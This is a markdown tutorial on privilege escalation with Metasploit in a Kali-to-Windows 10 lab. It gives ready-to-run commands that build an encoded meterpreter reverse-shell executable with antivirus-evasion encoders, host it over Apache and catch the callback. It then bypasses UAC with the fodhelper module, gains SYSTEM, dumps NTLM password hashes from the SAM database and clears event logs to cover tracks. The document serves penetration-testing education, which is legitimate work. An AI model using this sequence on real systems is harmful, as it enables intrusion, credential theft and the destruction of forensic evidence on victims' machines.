# Privilege-Escalation

## Performing privilege escalation using Metasploit

Before digging deeper into the attack mechanism, let's understand what exactly is meant by "Privilege escalation". Imagine you're at a party, and you have a VIP wristband that lets you access the exclusive VIP area. But what if you could somehow sneak past the bouncer and upgrade your VIP wristband to a "Super" VIP wristband that lets you access even more exclusive areas of the party? That's kind of like what a privilege escalation attack does - it sneaks past the security measures in place and gives the attacker more privileges than they were originally supposed to have, allowing them to access sensitive information or perform malicious actions.

Privilege escalation is a type of attack in which an attacker gains access to a system or network with limited privileges, such as a normal user account, and then exploits a vulnerability or flaw in the system to elevate their privileges to a higher level. This higher level of privilege may allow the attacker to perform actions that would normally be restricted, such as accessing sensitive information, installing malware, modifying system configurations, or even taking complete control of the system.
There are two main types of privilege escalation: ***vertical and horizontal***. In vertical privilege escalation, the attacker gains higher privileges by exploiting a vulnerability or flaw in the system that allows them to escalate their privileges to a higher level, such as gaining administrative access. In horizontal privilege escalation, the attacker gains the same level of privileges as another user, but on a different account or system. For example, if a user has access to sensitive data on one system, an attacker might use a horizontal privilege escalation attack to gain access to that same data on a different system. Horizontal privilege escalation attacks are typically less severe than vertical attacks, but they can still pose a serious threat if sensitive data or resources are accessed without authorization.

Now that we know what is meant exactly by the attack strategy that we're using here, let's get into creating the exploit. Our attacker machine here will be Kali Linux (IP: 192.168.100.5 ) and Windows 10 (IP: 192.168.100.6 ). Both virtual machines are Natted in a NAT network, however, it wont be necessary for you to NAT them since we'll be using Apache server in order to create a shared folder to access the malicious backdoor.exe file.

## First, we'll begin by creating a malicious .exe file using msfvenom:

Msfvenom has numerous payloads that you can choose from, just keep in mind to choose ones that are compatible with the target OS and the architecture. Here, since we're targeting a Windows OS, we'll use meterpreter/reverse_tcp. 

***Meterpreter vs Non-Meterpreter***: Meterpreter payloads are more versatile and powerful, but they can also be larger in size and more likely to be detected by security tools. Non-meterpreter payloads are smaller and simpler, making them more likely to evade detection, but they may not provide the same level of functionality and flexibility as Meterpreter.

`msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -ex86/xor_dynamic -ex86/shikata_ga_nai -b "\x00" LHOST=192.168.100.5 -i 5 -f exe > /home/kali/Desktop/Exploit.exe`

The above command will create the malicious executable file named **Exploit.exe** and will be saved on Kali's **desktop**. Multiple encoders (**xor_dynamic** and **shikata_ga_nai**) have been used to obfuscate the payload. The **-i** option specifies the number of times the payload will be encoded. Each iteration applies a different encoding algorithm to the payload, making it more difficult to detect by anti-virus software and other security mechanisms. But keep in mind that increasing the no. of iterations also increases the final payload's size.

## Second, we'll use the Apache config. to share the exploit:

First, make sure that you have apache2 installed. You can type `apache2 -v` in your terminal. This will get you the version type and an indication of whether you have apache2 installed or not.
If not, you can install it by typing `apt-get install apache2`. 

Navigate to the apache2 folder and open the apache2.conf configuration file using the following command: `vim /etc/apache2/apache2.conf`. 

Add a new line: `servername localhost` to the apache file under **# ServerName** and save the file.

Navigate back to the terminal and create a new directory inside html folder:

`mkdir /var/www/html/share/`

Now, change the permissions of the above directory and all of its contents (recursively) to allow read and execute access for all users and write access for the owner of the files/directories:

`chmod -R 755 /var/www/html/share/`

Change the ownership of that folder to www-data:

`chown -R www-data:www-data /var/www/html/share/`

Now copy the malicious executable file to the shared location:

`cp /home/kali/Desktop/Exploit.exe /var/www/html/share/`


Start the apache service to run the http server:

`service apache2 start`

>Note that the system may ask you to input your machine's password in order to start the apache service.


## Third, prepare the exploit:

We'll start the Metasploit Framework by typing:

`msfconsole`


Select the multi/handler and set the payload to meterpreter/reverse_tcp:

`use exploit/multi/handler`

`set payload windows/meterpreter/reverse_tcp`

The above commands set up a listener for incoming connections from an exploited target and set the payload for the exploit module to "windows/meterpreter/reverse_tcp".


Set the LHOST to the Kali IP address:

`set LHOST 192.168.100.5`


Start the exploit in the background:

`exploit -j -z`


The exploit starts and runs in the background as well as the reverse TCP handler which keeps listening for any connections on port 4444 (default port unless specified using `set LPORT`).


## Fourth, perform the exploitation:


Up until now, all of the aforementioned activities were done on the Kali Linux machine. Now, we'll switch to the Windows 10 machine to download the malicious executable file (Exploit.exe).


On the Windows machine, launch any browser and type:

`http://192.168.100.5/share/` _(Change to the IP address of your Kali machine)._


Click on **Exploit.exe**, download the executable file, and double-click on it to run it.

If an Open File - Security Warning window appears, click Run.


Now switch back to the Kali linux machine terminal and you'll notice that a Meterpreter session has successfully opened.


## Fifth, interacting with the session:

Now that we have successfully established a connection with the target device, we'll need to interact with it.
To do that, type the following commands on your Kali terminal:

`sessions` or `sessions -i` in order to list the current opened sessions. To open any session, select the ID by issuing the command:

`sessions <ID>` _(Replace `<ID>` with the ID number of the active session that you want to interact with)_


Open the current Meterpreter session and type:

`getuid`

The above command will get you the ID of the current user your under in the target Windows machine. Basically determines your current level of access.

```
meterpreter > getuid
Server username: DESKTOP-IDQ2IC4\guest  
```

Observe from the above result that you're currently running under normal (low-level) user privileges, therefore, performing actions such as hashdump or clearev won't be possible unless you escalate your privileges.

Let's try to escalate our privileges by issuing a `getsystem` command:


`getsystem -t 1`

```
meterpreter > getsystem -t 1
[-] priv_elevate_getsystem: Operation failed: Access is denied. The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
```

As you can see from the above result, the windows system UAC is blocking you from gaining unrestricted access to it. In order to bypass the UAC security setting, we'll push the current meterpreter session to the background in order to start another exploit, by issuing the following command:

`background`


We'll use the bypassuac_fodhelper exploit module which targets a vulnerability in the Fodhelper.exe binary. The following command will help us bypass the windows user account control settings and elevate our privileges:

`use exploit/windows/local/bypassuac_fodhelper`


Type `sessions` to see the ID of the previous meterpreter session and set it to the current exploit:

`set SESSION <ID>`


Type `run` to run the exploit.


>At this point, the BypassUAC exploit has bypassed the UAC setting on the Windows 10 machine and opened a new session. Now let's try to escalate our privileges again:

`getsystem -t 1`

```
meterpreter > getsystem -t 1

...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
```

As you can see, the command has successfully escalated user privileges and returns a message stating got system.

The getsystem technique that we're using here is Named Pipe Impersonation, for more information regarding the techniques and their usages, visit this [website](https://docs.rapid7.com/metasploit/meterpreter-getsystem/).


Now type `getuid` again to observe your current user privileges after escalating them:

`getuid`

```
meterpreter > getuid
Server username: ADMINISTRATOR\SYSTEM
```

As you can see you're now running under SYSTEM or ROOT privileges. Therefore, we'll run the following hashdump and clearev commands.

**Hashdump** is used to dump the password hashes from the Windows SAM database. The SAM database is where Windows stores local user account information, including the encrypted password hashes.

**Clearev** is used to clear the Windows event logs in order to cover your tracks and hide your activity on the compromised machine.

Now let's try to obtain the hashes located in the SAM file of Windows 10 by typing:

`run post/windows/gather/smart_hashdump`

As you can see all the NTLM hashed passwords are dumped and you can use tools such as john-the-ripper to crack these password hashes.


To clear the windows event logs:

`clearev`

If you want to clear a specific Event Log, you can use the -l option followed by the name of the Event Log. For example:

`meterpreter > clearev -l Security`


This will clear the Security Event Log.





